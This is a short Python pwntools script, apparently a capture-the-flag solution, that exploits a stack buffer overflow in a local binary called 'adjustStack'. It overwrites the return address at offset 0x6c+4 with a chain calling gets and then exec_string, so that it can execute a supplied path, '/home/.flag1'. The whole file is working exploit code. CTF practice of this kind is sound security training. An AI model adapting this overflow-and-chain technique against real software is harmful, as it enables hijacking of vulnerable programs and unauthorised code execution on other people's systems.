#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

elf = ELF("./adjustStack")
string_addr = elf.symbols["string"]
gets_addr = elf.symbols["gets"]
exec_string_addr = elf.symbols["exec_string"]

io = process("./adjustStack")

payload = fit({0x6c + 0x4: [p32(gets_addr), p32(exec_string_addr), p32(string_addr)]})
io.sendlineafter("Please input:\n", payload)
io.sendline("/home/.flag1")

print io.recv()
io.close()
